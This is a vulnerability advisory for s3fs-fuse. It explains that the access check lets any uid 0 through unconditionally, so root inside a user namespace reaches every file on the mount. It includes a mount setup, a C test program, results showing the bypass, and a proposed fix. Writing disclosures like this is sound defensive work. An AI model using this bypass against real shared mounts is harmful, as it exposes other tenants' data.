# s3fs-fuse Unconditional Root UID Bypass in Access Control Allows Privilege Escalation via User Namespaces

## Summary

s3fs-fuse's `check_object_access()` function unconditionally grants full access when the requesting user's UID is 0, without verifying whether the UID represents a genuinely privileged host-level root or a namespace-remapped root. In Linux user namespace environments (rootless Docker containers, Kubernetes pods with `userns` remapping), the namespace-local `uid=0` is mapped to an unprivileged host user, but s3fs still grants unrestricted access to all files and operations.

## Details

In `src/s3fs.cpp`, the function `check_object_access()` (around line 673) contains:

```cpp
if(0 == pcxt->uid){
    // root is allowed all accessing.
    return 0;
}
```

This check is invoked at least 59 times across all file operations (open, read, write, unlink, mkdir, rename, chmod, chown, etc.), making it the primary access control gate. The `pcxt->uid` value comes directly from `fuse_in_header.uid` provided by the kernel FUSE client.

In a user namespace context:
- A container's internal `uid=0` is mapped to an unprivileged host UID (e.g., `uid=100000`) via `/etc/subuid`.
- The kernel FUSE client fills `fuse_in_header.uid` with the namespace-local UID, which is `0`.
- s3fs receives `uid=0` and bypasses all permission checks, granting the unprivileged container user full access to all S3 objects on the mount.

## PoC

```bash
# Host: mount s3fs with allow_other for shared access
s3fs testbucket /mnt/s3 \
  -o passwd_file=~/.passwd-s3fs \
  -o url=http://localhost:9000 \
  -o use_path_request_style \
  -o allow_other

# Create a restricted file owned by uid 500
echo "sensitive data" > /mnt/s3/secret.txt
chown 500:500 /mnt/s3/secret.txt
chmod 600 /mnt/s3/secret.txt
```

Test program (run as different UIDs to demonstrate):

```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

int main(void) {
    const char *path = "/mnt/s3/secret.txt";
    int fd = open(path, O_RDONLY);
    printf("uid=%d open(%s): fd=%d errno=%s\n",
           getuid(), path, fd, fd >= 0 ? "success" : strerror(errno));
    if (fd >= 0) close(fd);
    return 0;
}
```

Results:

```
uid=500  open(/mnt/s3/secret.txt): fd=3  errno=success     # owner — correct
uid=1000 open(/mnt/s3/secret.txt): fd=-1 errno=Permission denied  # other — correct
uid=0    open(/mnt/s3/secret.txt): fd=3  errno=success     # root bypass — VULNERABLE
```

In a user namespace (e.g., rootless Docker), a process running as container `uid=0` (mapped to host `uid=100000`) receives the same unrestricted access as genuine host root.

## Impact

s3fs-fuse is commonly deployed to expose S3 storage as a POSIX filesystem for applications, backup systems, and shared storage in containerized environments. With the rise of rootless containers and Kubernetes user namespace isolation (`hostUsers: false`), the attack surface is significant:

- **Container escape (data plane):** A container process running as `uid=0` inside a rootless container can read, modify, and delete any S3 object on the mount, bypassing per-user ACLs.
- **Multi-tenant data breach:** In shared S3 bucket scenarios where different users own different objects, any container root can access all tenants' data.
- **Compliance violation:** Security frameworks (SOC2, HIPAA) require that unprivileged containers cannot access data outside their authorization scope. The blanket `uid=0` bypass breaks this invariant.

The `allow_other` mount option, which is required for containers to access the mount, directly exposes this vulnerability.

## Suggested Fix

Replace the unconditional `uid==0` bypass with a check that accounts for user namespace context. At minimum, drop the blanket root bypass and rely on standard POSIX permission matching:

```cpp
// Remove or gate the uid==0 bypass:
// Option 1: Remove entirely, rely on permission bits
// if(0 == pcxt->uid){
//     return 0;
// }

// Option 2: Only bypass for the daemon's own real root context
if(0 == pcxt->uid && !is_user_namespace_remapped(pcxt->pid)){
    return 0;
}
```

A more robust approach is to check `/proc/<pid>/status` for the `NSpid`/`Uid` lines to determine whether the requesting `uid=0` is a real host root or a namespace-remapped user, or to rely on the kernel's `from_kuid()` mapping and reject unmapped UIDs.

---

**Full PoC and scripts**: [GitHub Repository](https://github.com/APEvul-cyber/FUSE_s3fs-fuse_vul/tree/main/FUSE_IN_HEADER_uid_response)
